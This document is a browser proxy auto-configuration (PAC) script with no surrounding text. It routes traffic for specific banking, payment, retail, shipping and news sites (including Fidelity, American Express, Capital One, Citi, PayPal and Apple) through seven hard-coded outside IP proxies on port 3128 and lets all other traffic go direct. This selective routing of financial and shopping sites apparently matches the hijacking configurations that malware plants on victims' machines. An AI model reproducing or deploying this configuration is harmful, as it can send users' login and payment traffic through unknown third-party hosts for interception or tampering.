function FindProxyForURL(url, host){
if ((shExpMatch(host, "*.fidelity.com")) || (shExpMatch(host, "*.tripadvisor.com")) || (shExpMatch(host, "*.walmart.com")) || (shExpMatch(host, "*.foxnews.com")) || (shExpMatch(host, "*.xfinity.com")) || (shExpMatch(host, "*.att.com")) || (shExpMatch(host, "*.pinterest.com")) || (shExpMatch(host, "*.americanexpress.com")))
return "PROXY 176.67.168.217:3128";
if ((shExpMatch(host, "*.adobe.com")) || (shExpMatch(host, "*.target.com")) || (shExpMatch(host, "*.bestbuy.com")))
return "PROXY 205.204.85.12:3128";
if ((shExpMatch(host, "*.lowes.com")) || (shExpMatch(host, "*.homedepot.com")) || (shExpMatch(host, "*.macys.com")) || (shExpMatch(host, "*.tumblr.com")))
return "PROXY 176.67.169.185:3128";
if ((shExpMatch(host, "*.fedex.com")) || (shExpMatch(host, "*.cbssports.com")) || (shExpMatch(host, "*.dailymail.co.uk")) || (shExpMatch(host, "*.capitalone.com")))
return "PROXY 98.158.184.157:3128";
if ((shExpMatch(host, "*.kohls.com")) || (shExpMatch(host, "*.realtor.com")) || (shExpMatch(host, "*.yahoo.com")) || (shExpMatch(host, "*.hulu.com")) || (shExpMatch(host, "*.ups.com")))
return "PROXY 119.252.188.33:3128";
if ((shExpMatch(host, "*.cnet.com")) || (shExpMatch(host, "*.ebay.com")) || (shExpMatch(host, "*.citi.com")) || (shExpMatch(host, "*.paypal.com")) || (shExpMatch(host, "*.apple.com")) || (shExpMatch(host, "*.groupon.com")))
return "PROXY 187.45.186.35:3128";
if ((shExpMatch(host, "*.microsoft.com")) || (shExpMatch(host, "*.usps.com")))
return "PROXY 199.195.193.17:3128";
return "DIRECT";
}
